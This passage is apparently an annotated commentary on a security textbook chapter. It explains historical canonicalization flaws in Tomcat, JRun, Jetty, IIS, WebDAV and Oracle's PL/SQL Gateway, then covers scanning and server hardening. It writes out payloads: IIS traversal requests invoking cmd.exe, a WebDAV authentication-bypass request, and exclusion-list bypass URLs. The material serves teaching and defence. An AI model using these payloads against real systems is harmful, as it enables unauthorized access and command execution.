Another historical example involved Java-based web servers and vulnerable Java Virtual Machines. The important distinction here is that the vulnerability was *not simply a bug in Tomcat itself.*

Apache's Tomcat security documentation explains that the underlying problem was incorrect handling of certain UTF-8 encoded URLs by vulnerable JVM implementations. Tomcat was affected when the connector used UTF-8 URI decoding. The relevant overlong UTF-8 representations were essentially:

```
%c0%ae
```

for:

```
.
```

and:

```
%c0%af
```

for:

```
/
```

Therefore:

```
%c0%ae%c0%ae%c0%af
```

represented an attempted encoded form of:

```
../
```

An attacker could therefore construct a path containing repeated encoded traversal sequences. The underlying failure was a disagreement between *what the initial request-processing layer considered a valid path and what the vulnerable UTF-8 decoder subsequently transformed it into.* This is exactly the canonicalization problem we've been discussing:

```
Incoming representation
        ↓
Security check
        ↓
"Looks harmless"
        ↓
Additional decoding
        ↓
Traversal sequence appears
        ↓
Filesystem access
```

Tomcat's own documentation later clarified that this was fundamentally a JVM decoding problem affecting multiple vendors, rather than an ordinary Tomcat implementation flaw.

#### Allaire JRun Directory Listing Vulnerability:

The JRun example is a particularly nice demonstration of how *different components can disagree about where a URL ends and where its query string begins.* The vulnerable JRun versions included 2.3.3, 3.0, and 3.1. A request such as:

```
GET /dir/%3F.jsp HTTP/1.1
Host: wahh-app.com
```

contains:

```
%3F
```

which represents:

```
?
```

Normally, the question mark separates the URL path from its query string:

```
/path/file.jsp?parameter=value
```

The vulnerable processing chain effectively did this:

```
Initial URL parser
        ↓
Sees "%3F"
        ↓
Doesn't yet treat it as "?"
        ↓
Request appears to end in ".jsp"
        ↓
JSP handler processes it
        ↓
Another component decodes "%3F"
        ↓
Now it becomes "?"
        ↓
Path is interpreted differently
        ↓
Directory listing returned
```

So a URL such as:

```
/dir/%3F.jsp
```

could trigger directory browsing even when a normal request to:

```
/dir/
```

would have returned an ```index.html``` file instead. The vulnerability is documented as *CVE-2001-1510,* which describes the ability to read arbitrary files and directories by appending ```%3f.jsp```, ```?.jsp```, or ```?``` to a requested URL. The important lesson is not really the weird ```%3F.jsp``` trick itself. It's this:

***A security decision made before decoding may become invalid after another component decodes the same data.***

#### Jetty and the Question-Marked Directory:

The book's Jetty comparison also deserves a small correction and comments. The 2009 Jetty vulnerability involved incorrect canonical-path handling and could permit traversal outside the normal document tree under particular configurations.

On Unix-like systems, exploitation required a directory whose name ended in ```?```; on Windows, that additional condition did not apply in the same way. The affected versions included Jetty 5.1.14, 6.x before 6.1.17, and early 7.x releases. So the general lesson is again:

```
URL representation
        ↓
Path parsing
        ↓
Canonicalization
        ↓
Filesystem path
```

If those stages disagree, a seemingly harmless URL can resolve somewhere the developer never intended.

#### Microsoft IIS Unicode Path Traversal:

Now we reach one of the classic examples of canonicalization gone horribly wrong. The older IIS vulnerabilities were based on a fundamental mistake: *IIS attempted to detect traversal* ***before*** *completely canonicalizing the URL.*

Imagine a security filter looking for:

```
../
```

and:

```
%2E%2E%2F
```

An attacker doesn't necessarily need to submit either representation. If another decoder later transforms an unusual encoding into ```../```, the filter never sees the dangerous sequence. Conceptually:

```
Attacker input
      ↓
Security filter
      ↓
"No ../ detected!"
      ↓
Additional decoding
      ↓
../
      ↓
Filesystem
```

That was the fundamental class of mistake behind the historic IIS Unicode traversal vulnerabilities. IIS 4.0 and 5.0 were affected by malformed Unicode URLs that could allow access outside the web root and potentially command execution.

The important sequence is:

```
%c0%af
```

which was an *invalid/overlong UTF-8 representation historically interpreted as ```/``` by vulnerable software.* Similarly, an encoded representation involving:

```
%c0%ae
```

could represent ```.``` under the vulnerable decoding behavior. Thus, the conceptual attack path was:

```
%c0%ae%c0%ae%c0%af
        ↓
      ../
```

The attacker could construct a URL containing repeated encoded traversal components. A cleaned-up historical example is:

```
GET /scripts/..%c0%af..%c0%af..%c0%af..%c0%afwinnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.1
Host: wahh-app.com
```

The exact behavior depended on the vulnerable IIS version and configuration. The significance is that IIS's initial security checks did not recognize the malformed representation as a traversal sequence, while later processing interpreted it in a way that effectively produced one.

**Double-Encoding:**

The second IIS example demonstrates another classic trick: *double encoding.* Suppose:

```
/
```

is encoded as:

```
%2F
```

If the percent sign itself is encoded:

```
%25
```

we get:

```
%252F
```

The first decoding pass produces:

```
%2F
```

and the second produces:

```
/
```

Therefore:

```
%252F
   ↓ first decode
%2F
   ↓ second decode
/
```

The same principle can be applied to traversal sequences. For example:

```
..%255c
```

contains a doubly encoded backslash. Conceptually:

```
..%255c
    ↓
..%5c
    ↓
..\
```

A cleaned-up historical IIS request therefore looks like:

```
GET /scripts/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.1
Host: wahh-app.com
```

Again, the interesting part isn't the string itself. The interesting part is:

```
Security filter
      ↓
sees %255c
      ↓
doesn't recognize traversal
      ↓
decode #1
      ↓
%5c
      ↓
decode #2
      ↓
\
      ↓
filesystem interprets traversal
```

This is the classic *double-decoding vulnerability.*

#### IIS WebDAV: The Ghost of ```%c0%af```

And here we get a wonderfully fitting sequel. Nearly a decade after the earlier IIS traversal vulnerabilities, a very similar canonicalization problem appeared in *IIS 6 WebDAV.* The 2009 vulnerability, *CVE-2009-1535,* could allow authentication bypass and unauthorized access to protected WebDAV resources. Microsoft issued security advisory 971492 for the issue. A historically documented request looked roughly like:

```
GET /..%c0%af/protected/protected.zip HTTP/1.1
Host: wahh-app.net
Translate: f
Connection: close
```

The important pieces are:

```
%c0%af
```

and:

```
Translate: f
```

The malformed Unicode representation could evade one stage of path validation and later be interpreted as a path separator.

**Additional Notes:** *What Does ```Translate: f``` Mean?*

This header is part of Microsoft's WebDAV implementation. The ```Translate``` header controls whether the WebDAV server should process the requested resource or return its underlying content. Historically:

```
Translate: f
```

effectively requested the resource in its raw form rather than asking the server to interpret it as an executable/application resource. CERT-FR specifically documented the role of ```Translate: f``` in this vulnerability and recommended filtering requests containing ```%c0%af``` together with this header as a temporary mitigation.

So the header wasn't itself the vulnerability. It helped select the particular WebDAV processing path through which the canonicalization flaw could be exploited.

#### The WebDAV ```PROPFIND``` Request:

The final example in the book has suffered some spectacular PDF/OCR damage. A cleaned-up version is conceptually:

```
PROPFIND /protected/ HTTP/1.1
Host: wahh-app.net
Depth: 1
Content-Type: application/xml
Content-Length: 0
```

A genuine WebDAV ```PROPFIND``` request can contain an XML body asking for specific properties:

```
PROPFIND /protected/ HTTP/1.1
Host: wahh-app.net
Depth: 1
Content-Type: application/xml
Content-Length: 200

<?xml version="1.0" encoding="utf-8"?>
<propfind xmlns="DAV:">
  <prop>
    <getcontentlength />
    <getlastmodified />
    <resourcetype />
  </prop>
</propfind>
```

The purpose of ```PROPFIND``` here is to request metadata about resources rather than simply downloading one. The ```Depth``` header determines how far the server should enumerate resources:

```
Depth: 0
```

means the requested resource itself.

```
Depth: 1
```

means the resource plus its immediate children. That makes ```PROPFIND``` particularly useful when investigating WebDAV resources because it can expose directory structure and metadata.

**Additional Notes:**

At first glance, all these vulnerabilities look completely unrelated:

```
WEBrick
Java
JRun
Jetty
IIS
IIS WebDAV
```

But underneath, they share almost exactly the same weakness. A request passes through several transformations:

```
                    ┌─────────────────┐
                    │  Attacker Input │
                    └────────┬────────┘
                             ↓
                    URL parser / proxy
                             ↓
                    Security filtering
                             ↓
                    URL decoding
                             ↓
                    Unicode decoding
                             ↓
                    Path canonicalization
                             ↓
                    WebDAV / JSP / handler
                             ↓
                       Filesystem
```

*If any two stages disagree about what the input means,* the security boundary can potentially be bypassed. For example:

```
%c0%af
```

might mean:

```
"invalid garbage"
```

to one component, but:

```
"/"
```

to another. Likewise:

```
%252F
```

might initially mean:

```
"%2F"
```

but after another decoding pass becomes:

```
"/"
```

The fundamental rule is beautifully simple: ***canonicalize once, validate the canonical representation, and make sure every subsequent component interprets it the same way.***

Security filters should not attempt to recognize every possible encoded representation of dangerous input. They should operate on a well-defined canonical representation, and downstream components should not unexpectedly reinterpret that data. This is why canonicalization bugs are so dangerous: *the attacker doesn't necessarily need to defeat the security check. They only need to make the security check and the component performing the dangerous operation disagree.*

#### Oracle PL/SQL Exclusion List Bypasses:

Recall the dangerous functionality exposed by Oracle's *PL/SQL Gateway.* The gateway could receive a URL containing the name of a database schema, package, and procedure, and then invoke that PL/SQL code. This was obviously rather dangerous when arbitrary packages could be reached through the web interface.

To reduce this attack surface, Oracle introduced the *PL/SQL Exclusion List.* The list contained patterns corresponding to packages and schemas that should not be accessible through the gateway. Examples included names beginning with ```OWA```, ```SYS```, ```DBMS_```, ```HTP_```, ```HTF_```, and ```UTL_```. The basic idea was straightforward:

```
HTTP request
     |
     v
PL/SQL Gateway
     |
     |  "Does this name match something dangerous?"
     |
     +---- YES ---> reject
     |
     +---- NO ----> pass to Oracle database
```

Unfortunately, the implementation relied heavily on *textual filtering,* while the Oracle database subsequently interpreted the input according to its own parsing and character-conversion rules. That distinction created a long series of bypasses.

**1. Whitespace Before the Package Name:**

The first bypass was remarkably simple. The filter expected the dangerous name to begin immediately with something such as:

```
SYS
```

An attacker could instead place encoded whitespace before it:

```
https://wahh-app.example/pls/dad/%0ASYS.PACKAGE.PROCEDURE
```

Here:

```
%0A    = line feed / newline
```

Other whitespace characters could also be used:

```
%20    = space
%09    = horizontal tab
%0A    = line feed / newline
```

For example:

```
https://wahh-app.example/pls/dad/%20SYS.PACKAGE.PROCEDURE
https://wahh-app.example/pls/dad/%09SYS.PACKAGE.PROCEDURE
https://wahh-app.example/pls/dad/%0ASYS.PACKAGE.PROCEDURE
```

The filtering component could fail to recognize these strings as beginning with the forbidden ```SYS``` expression. Later, however, the input reached the database processing layer, where the leading whitespace was insignificant and the dangerous name was interpreted normally. In other words:

```
Filter sees:

    %0ASYS

Database sees:

    SYS
```

The important lesson is not really the newline itself. The important lesson is that *the filter and the component processing the input disagreed about what the input meant.*

**2. Character-Set Conversion: ```%FF```**

The second bypass is considerably stranger. The original examples sometimes appear in my old material as though ```%FF``` simply represents the letter ```Y```. It does *not.* ```%FF``` represents the byte:

```
0xFF
```

Depending on the character sets and conversions involved, the vulnerable Oracle stack could convert this value into ```Y``` when processing the request. That meant a request such as:

```
https://wahh-app.example/pls/dad/S%FFS.PACKAGE.PROCEDURE
```

could pass a filter looking for the literal string:

```
SYS
```

while the later database processing effectively interpreted it as ```SYS```. Conceptually:

```
Front-end filter:

    S %FF S
      ^
      |
      +-- does not match literal "SYS"


Later character conversion:

    S %FF S
       |
       v
      Y

    => SYS
```

This behaviour depended on the character-set configuration of the components involved; it was not a universal property of ```%FF```. So this is an excellent historical example of why *canonicalization and internationalization are security-sensitive operations.*

**3. Quoting the Blocked Name:**

The next bypass was to place the supposedly forbidden name inside double quotation marks:

```
https://wahh-app.example/pls/dad/"SYS".PACKAGE.PROCEDURE
```

A simple filter looking for:

```
SYS
```

in the expected location could fail to recognize:

```
"SYS"
```

as the same database identifier. The database, however, could tolerate the quoted identifier and proceed with the invocation. Conceptually (again, as I like this word):

```
Filter:

    "SYS"
      ^
      |
      +-- not in the expected form

Database:

    "SYS"
      |
      v
    identifier SYS
```

There is an important historical qualification here: this technique did *not* work identically across all versions of Oracle Application Server. Oracle Application Server 10g could convert the request to lowercase before passing it to the database. Since quoted Oracle identifiers are case-sensitive, this could turn ```"SYS"``` into ```"sys"```, which was not equivalent to ```"SYS"```. Earlier versions behaved differently.

That is another useful reminder: *a vulnerability technique is often version-, configuration-, and processing-path-dependent.*

**4. The Curious Case of the GOTO Label:**

This one deserves a little explanation because the original text makes it sound rather magical. A *label* in PL/SQL is a name attached to a particular location in the program. It can be used together with the ```GOTO``` statement to jump to that location. A PL/SQL label has this general form:

```
<<LABEL_NAME>>
```

For example:

```
<<start_here>>

DBMS_OUTPUT.PUT_LINE('Hello');

GOTO start_here;
```

The label itself is not an instruction to execute something. It simply identifies a location in the code. The PL/SQL Gateway could be tricked by placing such a label before the forbidden name:

```
https://wahh-app.example/pls/dad/<<LBL>>SYS.PACKAGE.PROCEDURE
```

The filtering component could fail to recognize the dangerous expression because the input no longer literally began with ```SYS```. The later PL/SQL processing, however, could interpret the label syntax and effectively ignore it when resolving the requested schema/package name. So conceptually:

```
Filter sees:

    <<LBL>>SYS

    "Doesn't begin with SYS."

Database-side interpretation:

    <<LBL>>   <-- syntactic label
    SYS       <-- actual identifier
```

The angle brackets in ```<<LBL>>``` are therefore *PL/SQL label syntax,* not some mysterious URL encoding trick. In a modern HTTP request, angle brackets may themselves need appropriate encoding depending on the client, server, and request-processing path. For the cookbook, however, the raw form is useful because it makes the underlying PL/SQL syntax immediately visible.

At first glance these vulnerabilities look completely unrelated. One uses whitespace. Another uses character-set conversion. Another uses quoting. Another uses programming-language syntax. But they all exploit essentially *the same architectural mistake.* Imagine the request passing through several stages:

```
             HTTP request
                  |
                  v
        +-------------------+
        | Front-end filter  |
        | "Does this look   |
        |  dangerous?"      |
        +-------------------+
                  |
                  v
        +-------------------+
        | Decoding /        |
        | canonicalization  |
        +-------------------+
                  |
                  v
        +-------------------+
        | PL/SQL Gateway    |
        +-------------------+
                  |
                  v
        +-------------------+
        | Oracle parser     |
        +-------------------+
                  |
                  v
        Actual database object
```

The security filter is making a decision about the *raw or partially processed representation.* The database is making a decision about the *interpreted representation.* If those two representations differ, an attacker may be able to construct input that is harmless to the filter but dangerous to the interpreter. That is the essence of a *parser differential* or *canonicalization mismatch.*

The PL/SQL Gateway was unusually powerful because it was not merely serving static files. It provided a bridge between:

```
HTTP
  |
  v
Web server
  |
  v
PL/SQL Gateway
  |
  v
Oracle database
```

The final component was a highly capable programming environment. Consequently, mistakes in determining *which PL/SQL packages should be reachable* could have much more serious consequences than an ordinary URL parsing error.

David Litchfield documented a succession of these exclusion-list bypasses, and the subject received extensive treatment in his *Oracle Hacker's Handbook,* particularly in the chapter covering attacks against the PL/SQL Gateway. The important point is that repeatedly adding individual strings to a blacklist does not necessarily solve the underlying architectural problem. If the security boundary is:

```
"Reject dangerous-looking strings."
```

rather than:

```
"Parse the request exactly as the eventual interpreter will,
then authorize the resulting operation."
```

there may be another representation that slips through. This entire family of bugs can be reduced to one question: *what does the security filter think I supplied, and what does the final interpreter think I supplied?* For example:

```
                  FILTER             DATABASE
                  ------             --------

%0ASYS            harmless          SYS

S%FFS             harmless          SYS

"SYS"             harmless          SYS

<<LBL>>SYS        harmless          SYS
```

The attacker wins whenever:

```
FILTER(input) != INTERPRETER(input)
```

and the difference crosses a security boundary. This same pattern appears far beyond Oracle:

- URL canonicalization

- path traversal

- double encoding

- Unicode normalization

- HTTP request parsing

- proxy/backend disagreements

- SQL parsing

- XML parsing

- filesystem path handling

- authentication and authorization middleware

That is why these ancient Oracle bugs are still useful to study. The individual payloads are fossils. ***The class of mistake is not!***

Several years after the original PL/SQL Gateway bypasses, another interesting issue appeared in *Oracle Application Server Portal 10g.* In 2008, a vulnerability was reported in which a specially crafted request containing a trailing URL-encoded line-feed character:

```
%0A
```

could cause OracleAS Portal to generate a session identifier that could subsequently be used to bypass intended access restrictions and access content under:

```
/dav_portal/portal/
```

The vulnerability is tracked as *CVE-2008-2138.* The WAHH description phrases the issue in terms of a session-ID cookie ending in ```%0A```. The important conceptual point is that the unusual value affected how the Portal component handled the session and its authentication state. In other words, the problem was not simply "someone guessed a valid session ID"; rather, *special input influenced the way the application created or interpreted the session context,* allowing the normal Basic Authentication restriction to be bypassed. This is another variation on a theme we have already encountered repeatedly in this chapter:

```
special input
     |
     v
unexpected parsing / normalization
     |
     v
security decision made incorrectly
     |
     v
authentication or authorization bypass
```

The affected OracleAS Portal 10g software is historical today, but the underlying lesson remains very relevant: *authentication logic is only as strong as the parsing and normalization of the data on which that logic depends.*

A session identifier may look like an opaque string to one component while another component interprets some portion of it according to special rules. Whenever different layers disagree about the meaning of security-sensitive input, strange—and sometimes exploitable—behaviour can result. The Oracle PL/SQL Exclusion List saga is a particularly good demonstration of why *blacklists are fragile security boundaries.* The filter attempted to stop dangerous names:

```
SYS
OWA
DBMS_*
UTL_*
...
```

But the attacker did not necessarily have to change the *meaning* of the requested object. They only had to change its *representation.*

```
SYS
 ^
 |
 +-- whitespace
 +-- character conversion
 +-- quoting
 +-- labels
 +-- other parser tricks
```

If the filtering layer and the interpreting layer use different rules, there will potentially be representations that one considers safe and the other considers dangerous. The durable defensive principle is therefore: *normalize and parse security-sensitive input according to the same rules used by the component that will ultimately interpret it, and perform authorization on that canonical representation.*

### Finding Web Server Flaws:

If you are lucky, a web server you are assessing may still contain one of the vulnerabilities described in this cookbook. More often, however, the software will have been patched, and you will need to investigate newer vulnerabilities or discover weaknesses that have not yet been publicly documented.

A good starting point when assessing an off-the-shelf product, such as Apache HTTP Server, NGINX, Microsoft IIS, or Apache Tomcat, is to use an *automated vulnerability scanner.* Unlike custom-built web applications, which may contain unique business logic and implementation flaws, web servers are widely deployed third-party products. Many installations share the same software components, default settings, and known weaknesses.

Automated scanners can therefore be effective at identifying relatively straightforward problems by sending carefully constructed requests, inspecting responses, identifying exposed services, and comparing observed behaviour against known vulnerability signatures. However, it is important to distinguish between several kinds of assessment:

- *Port and service discovery* identifies reachable services and attempts to determine what software is running.

- *Vulnerability scanning* compares the discovered software and its behaviour against known vulnerabilities and insecure configurations.

- *Web application testing* investigates application-level weaknesses such as injection, access-control failures, and path traversal.

- *Manual security testing* examines behaviour that automated tools may not recognize, including unusual parser interactions, logic flaws, and application-specific assumptions.

These activities overlap, but none replaces all the others. The following tools are useful additions to a modern web-server testing toolkit.

1. **Nmap:**

Nmap is a network discovery and security auditing tool. Its service-detection capabilities can help identify exposed ports and the software that appears to be listening on them.

2. **Nikto:**

Nikto is an established web-server scanner that checks for potentially dangerous files, insecure configurations, outdated software, and other known issues. It is particularly useful for finding common web-server misconfigurations and exposed default content. Nikto is not a substitute for a full penetration test, and some findings require manual verification.

3. **Nuclei:**

Nuclei is a template-based scanner. Its templates describe checks for known vulnerabilities, misconfigurations, exposed resources, and other recognizable conditions. The quality of the results depends on the templates, the target's actual configuration, and the accuracy of the checks. A template match should be treated as a finding to validate, not automatic proof that exploitation is possible.

4. **OWASP ZAP and Burp Suite:**

*OWASP ZAP* and *Burp Suite* are particularly useful when the assessment extends beyond the web server itself to the application running on it. They can help inspect HTTP requests and responses, explore application behaviour, and identify certain classes of web vulnerabilities. Their strengths are not identical to those of infrastructure-focused scanners. A web application scanner may uncover an access-control flaw while missing a host-level configuration problem, and a server scanner may identify an outdated service without understanding the application's business logic.

Also, commercial vulnerability-management platforms, such as those offered by Tenable and Rapid7, can also assess hosts and services against extensive vulnerability and configuration databases. For a home lab, a sensible starting combination is Nmap for service discovery, Nikto or Nuclei for targeted checks, and Burp Suite or ZAP when the application itself needs investigation. OWASP maintains a broader list of vulnerability-scanning tools for comparison.

#### Researching vulnerabilities manually:

Automated scanning is only one part of the process. You should also investigate the software yourself. The original WAHH chapter recommends resources such as SecurityFocus, OSVDB, Bugtraq, Full Disclosure, Exploit Database, and Metasploit. These were useful resources in their time, but the security-research ecosystem has changed considerably. OSVDB is discontinued, and several older vulnerability-discussion resources are now primarily of historical interest. Their underlying purpose—finding reliable technical information about newly discovered vulnerabilities—remains essential.

*Modern vulnerability-research resources:*

- **CVE Program** — identifiers and records for publicly disclosed vulnerabilities.

- **National Vulnerability Database (NVD)** — vulnerability information, affected-product details, references, and severity-related data.

- **CISA Known Exploited Vulnerabilities Catalog** — a particularly useful resource for identifying vulnerabilities known to have been exploited in the wild.

- **GitHub Advisory Database** — vulnerability advisories for open-source packages and software ecosystems.

- **OSV.dev** — vulnerability information particularly useful for identifying affected open-source package versions.

- **Vendor security advisories** — official notices from the developers or distributors of the affected product.

- **Exploit Database** — a collection of publicly available exploit code and proof-of-concept material.

- **Metasploit Framework** — a penetration-testing framework that includes modules for detecting and testing selected known vulnerabilities.

- **Apache HTTP Server security information** — official security announcements for Apache HTTP Server.

These resources serve different purposes. A CVE record helps identify a vulnerability, a vendor advisory explains which product versions are affected and how to remediate the issue, and an exploit repository may contain code demonstrating the weakness. No single database is guaranteed to contain every relevant detail. Cross-check important findings against the affected vendor's documentation.

Suppose you identify an Apache Tomcat installation during an authorized assessment. Rather than immediately searching for a working exploit, follow a structured process:

1. Identify the product and, where possible, its exact version.

2. Establish whether it is the upstream release or a vendor-packaged build.

3. Consult the vendor's security advisories and release notes.

4. Search the CVE Program, NVD, and relevant open-source advisory databases.

5. Check whether any relevant vulnerabilities are known to be exploited in the wild.

6. Consult Exploit Database or Metasploit to understand whether a public proof of concept exists.

7. Determine whether the target's configuration and exposure match the documented prerequisites.

8. Validate the finding safely in a lab or through an authorized, appropriately controlled test.

9. Document the evidence, impact, and recommended remediation.

A public exploit does not automatically mean that a particular installation is vulnerable. The affected version, configuration, authentication requirements, network exposure, and other prerequisites all matter. Likewise, the absence of a public exploit does not prove that the software is secure.

*But wait, what about zero-day vulnerabilities?*

A zero-day vulnerability is a flaw for which a relevant patch or effective fix is not yet available to the affected party. Usage of the term varies slightly depending on whether the vulnerability is known to the vendor, publicly disclosed, or already being exploited. Finding one requires substantially more than running a scanner. It may involve source-code review, binary analysis, protocol research, differential testing, fuzzing, or careful investigation of unexpected behaviour. A responsible research process also includes keeping testing within the authorized scope and reporting newly discovered issues through the vendor's security-reporting process or an appropriate coordinated-disclosure channel.

#### Bundled web servers: an often-overlooked risk:

Some applications ship with their own web-server software or include embedded server components. An enterprise application might bundle Apache HTTP Server, Jetty, Tomcat, or another server as part of its installation. This can create a patch-management problem.

An administrator may consider the bundled server part of the application rather than part of the underlying infrastructure. Consequently, a security fix for the server may be available upstream but remain absent from the application's supported distribution for some time. Directly replacing a bundled component can also break compatibility or invalidate the application's vendor-support conditions. For example:

```
Enterprise application
        |
        +-- Application code
        |
        +-- Bundled web server
        |
        +-- Runtime and libraries
        |
        +-- Operating system
```

Patching only the operating system does not necessarily update the bundled server, and updating the standalone server package may not update the copy embedded inside the application. So, how should this be handled?

- Maintain an inventory of installed applications and their embedded components.

- Identify who is responsible for supplying security updates.

- Track the vendor's supported versions and remediation timelines.

- Check whether the application vendor has released a security update incorporating the upstream fix.

- Avoid unsupported component replacement without assessing compatibility and support implications.

- If the vendor cannot provide a timely fix, evaluate mitigations such as restricting network access, disabling the affected feature, isolating the component, or temporarily removing exposure.

A software bill of materials (SBOM), where available, can help identify the components and dependencies included in an application. This is also a situation in which manual testing can reveal defects that a generic scanner misses. A scanner may identify the server version but fail to understand how the bundled application changes its behaviour or exposes a particular function. If you are researching a suspected defect, reproducing it in a local installation or isolated lab is often safer and more informative than experimenting against a production system.

#### Securing Web Server Software:

Organizations deploying third-party web servers inevitably depend on the quality of the software supplied by their vendors. Nevertheless, they can take substantial steps to reduce the likelihood and impact of a compromise. The following sections expand the original WAHH recommendations with current defensive practices.

1. *Choose Software with a Good Security Track Record:*

Not all software products and vendors are equal. When evaluating a web-server product, consider:

- The frequency and severity of security vulnerabilities.

- The time taken to investigate and remediate reported issues.

- The quality and clarity of security advisories.

- The availability of supported security updates.

- The length of the product's support lifecycle.

- The quality of default security settings.

- The transparency of the development and disclosure process.

- The resilience of security fixes when independently reviewed.

- The availability of security configuration guides and community expertise.

Raw vulnerability counts alone are not a reliable measure of security. A widely used product may have more reported vulnerabilities simply because more researchers examine it. Conversely, a product with few public reports may have limited scrutiny rather than excellent security. A better approach is to evaluate the vendor's overall security process and the practical consequences of operating the product. For example, ask yourself:

- How quickly can I obtain and deploy a security update?

- Does the vendor clearly identify affected versions?

- Can I restrict or disable vulnerable functionality?

- Is the product still supported?

- Can I isolate the service if a serious vulnerability appears?

A well-maintained product with a predictable patching process is generally preferable to one that leaves administrators guessing about security status.

2. *Apply Vendor Security Patches:*

Security updates may address vulnerabilities discovered internally by the vendor, reported by independent researchers, or exploited by attackers in the wild. Once a vulnerability is disclosed and a patch becomes available, attackers can study the changes to understand what was fixed. In some cases, this enables them to develop a working exploit relatively quickly. Therefore, *patch management is a race against exposure, not simply an occasional maintenance task.*

A sensible patch-management process includes:

- Inventory the affected products and versions.

- Identify which systems are exposed and whether the vulnerability is remotely exploitable.

- Check the vendor's advisory for prerequisites, severity, and available mitigations.

- Prioritize based on active exploitation, exposure, impact, and the availability of a fix.

- Test updates where necessary, especially for business-critical systems.

- Deploy the updates within a risk-appropriate timeframe.

- Verify that the intended versions or fixes are actually installed.

- Record the result and continue monitoring for new information.

Not every patch must be handled identically. A critical, actively exploited vulnerability on an Internet-facing service deserves more urgency than a low-impact issue in a disabled component on an isolated machine. However, testing must not become an excuse for leaving a known, serious vulnerability exposed indefinitely. If immediate patching is impossible, consider temporary mitigations such as disabling the affected functionality, restricting access through a firewall, or placing the service behind an appropriate protective control. Such measures reduce risk but should not be mistaken for a permanent fix.

3. *Perform Security Hardening:*

Web servers usually provide many configurable options that control which features are enabled and how they behave. Every unnecessary feature adds potential attack surface. If an unused module, extension, handler, or administrative interface remains enabled, a future vulnerability in that component may create an opportunity for compromise. Consult the hardening guidance for the specific product and version you operate.

For Apache HTTP Server, use the official Apache security tips. For Microsoft IIS, consult Microsoft's current IIS documentation and appropriate security baselines. CIS also maintains server-specific benchmarks for products such as Apache HTTP Server, NGINX, Tomcat, and IIS.

Also, remove or disable components that the application does not require, including:

- Unused web-server modules and extensions.

- Unnecessary scripting engines and handlers.

- Default sample applications and demonstration content.

- Unused administrative consoles.

- Directory listing functionality where it is not needed.

- Unnecessary HTTP methods or protocol features, subject to application requirements.

- Unneeded database services or network listeners.

- Debugging endpoints and diagnostic pages that disclose sensitive information.

The goal is not to disable everything indiscriminately. The goal is to *enable only the functionality required for the service to perform its intended job.*

The original WAHH text mentions IIS Lockdown, a Microsoft utility from the era of older IIS releases. It helped administrators disable risky functionality and apply a more restrictive configuration. It is a historical tool, not a recommendation for hardening modern IIS installations.

*Review file extensions and request handlers!*

Web servers map URLs and file extensions to handlers. A request for a static image might be served directly, while a request for a server-side script might be passed to an interpreter. A dangerous configuration can cause files to be interpreted unexpectedly, expose source code, or make unnecessary execution features available. Review these mappings carefully. Remove obsolete handlers and ensure that only intended file types can trigger server-side execution. Do not rely on file extensions alone as a security boundary; the actual mapping and execution configuration determine how requests are handled.

Also, the original book recommends rewriting custom native-code server extensions in managed code where possible. The underlying concern is valid: native code can introduce memory-safety defects such as buffer overflows, use-after-free errors, and integer overflows. Managed runtimes can prevent or reduce certain classes of memory errors, depending on the language and runtime. However, managed code is not automatically secure. It can still contain injection flaws, authorization failures, unsafe deserialization, logic errors, and insecure interoperation with native libraries.

When native components are necessary:

- Use memory-safe languages where feasible.

- Apply strict input validation at trust boundaries.

- Check lengths, ranges, types, and encoding assumptions.

- Use compiler and runtime protections.

- Fuzz parsers and other complex input-processing code.

- Minimize the privileges of the process hosting the component.

- Keep native dependencies patched.

Input validation is useful, but it should complement—not replace—memory-safe implementation and appropriate runtime protections.

Furthermore, the original WAHH text suggests renaming some resources from their defaults to make them harder to discover. This can occasionally reduce exposure to simplistic automated probes, but it is *security through obscurity.*

Renaming an administrative URL does not replace authentication, authorization, network restrictions, or secure configuration. An attacker may discover the new name through application behaviour, documentation, links, logs, or other information. A better approach is to remove unnecessary resources entirely and protect necessary administrative functionality with strong authentication and restricted access.

Every component should receive only the permissions it needs. For a web server, this means considering several layers:

- The operating-system account used by the web-server process.

- File-system permissions on web content and configuration files.

- Permissions granted to application processes and background workers.

- Database permissions associated with application accounts.

- Access to cloud credentials, secrets, and management APIs.

- Network access to internal services.

- Container and operating-system isolation.

For example, a public-facing web process that only needs to read application files should not have permission to modify executable code or read unrelated sensitive files. Likewise, an application database account should not automatically have database-administrator privileges. If the web server is compromised, least privilege limits what the attacker can do next.

The original text mentions using a ```chroot``` environment on Unix-like systems. ```chroot``` changes the apparent root directory for a process, which can help restrict its view of the filesystem. However, chroot alone is not a complete security boundary. Modern deployments may use containers, namespaces, mandatory access-control systems such as SELinux or AppArmor, seccomp restrictions, and other operating-system protections to constrain a compromised process.

Containers are also not magic: their effectiveness depends on configuration, runtime security, host isolation, and the privileges granted to the workload. The defensive objective is to ensure that compromising one web-facing process does not automatically grant control over the host or the rest of the infrastructure.

4. *Monitor for New Vulnerabilities:*

Security monitoring should be an assigned, repeatable responsibility rather than an occasional search performed after an incident. Organizations should track new advisories affecting the products they actually use. Relevant sources include vendor security announcements, CVE and NVD records, CISA's Known Exploited Vulnerabilities Catalog, and suitable open-source security feeds. Where possible, automate notifications and connect them to an inventory of deployed software. For example, an advisory concerning a particular Tomcat release is much more actionable if the organization already knows which servers run that release.

Monitoring should cover more than the main web server. Remember the components hidden inside an application: runtimes, libraries, plugins, connectors, and bundled servers may all have separate patching requirements.

*Temporary mitigations:*

Sometimes a vulnerability becomes public before a complete patch is available, or a patch cannot be deployed immediately. In that situation, understanding the technical details may help administrators apply a temporary mitigation. Depending on the vulnerability, this could involve:

- Disabling the affected feature.

- Restricting access to a vulnerable endpoint.

- Blocking unnecessary network paths.

- Applying a vendor-recommended configuration change.

- Adding a carefully validated detection or filtering rule.

- Isolating the affected service from sensitive internal systems.

A workaround should be documented, tested, and reviewed after a permanent fix becomes available. Be careful with generic firewall or web-application-firewall rules. A rule that blocks one known payload may not cover alternative encodings or request paths. Such rules can provide useful defence in depth, but they should not be assumed to eliminate the underlying vulnerability.

5. *Use Defense in Depth:*

No single security control can guarantee that a web server will never be compromised. Defense in depth means combining multiple independent controls so that the failure of one does not automatically lead to a complete compromise of the system. Consider the following simplified architecture:

```
Internet
   |
   v
Firewall / network access controls
   |
   v
Reverse proxy / web application firewall
   |
   v
Web server
   |
   +----> Application process
   |
   +----> Database
   |
   +----> Internal services
   |
   v
Logging and monitoring infrastructure
```

